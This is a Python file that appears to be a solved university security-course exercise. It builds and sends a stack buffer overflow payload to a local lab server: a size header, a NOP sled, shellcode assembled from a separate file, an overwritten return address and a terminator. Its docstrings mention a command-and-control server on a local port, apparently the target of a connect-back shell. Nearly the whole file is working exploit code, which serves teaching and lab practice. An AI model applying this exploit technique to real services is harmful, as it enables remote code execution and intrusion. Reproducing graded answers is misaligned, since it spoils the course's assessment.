import os
import socket
import struct
from infosec.core import assemble


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337
NOP = '\x90'.encode('latin1')

PATH_TO_SHELLCODE = './shellcode.asm'

SIZE_OF_OVERFLOW = 1040

PATCHED_RET_ADDR = 0xbfffdef8

def get_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the bytes of the shellcode! The
    assembly code of the shellcode should be saved in `shellcode.asm`, use the
    `assemble` module to translate the assembly to bytes.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to use it from q3.py.
    1. Use the PATH_TO_SHELLCODE variable, and avoid hard-coding the path to the
       assembly file in your code.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/4/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. You can assume the IP and port of the C&C server won't change - they'll
       always be the values you see above in HOST and LOCAL_PORT.

    Returns:
         The bytes of the shellcode.
    """
    shellcode = assemble.assemble_file(PATH_TO_SHELLCODE)
    return shellcode

def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Tips:
    1. Use the `get_shellcode()` function from above, and just add the missing
       parts here.
    2. As before, use the `assemble` module to translate assembly into bytes.

    Returns:
         The bytes of the payload.
    """
    shellcode = get_shellcode()
    # size of the message in network order
    size = network_order_uint32(SIZE_OF_OVERFLOW + 4 + 1)
    # the return address in little endian
    patched_ret_addr = struct.pack('<I', PATCHED_RET_ADDR)
    # the payload is built of the size of the message then the nop sile and the shellcode then the patched return address and then the "\0" to end the message
    payload = size + shellcode.rjust(SIZE_OF_OVERFLOW, NOP) + patched_ret_addr + "\0".encode('latin1')
    return payload

def network_order_uint32(value) -> bytes:
    return struct.pack('>L', value)


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
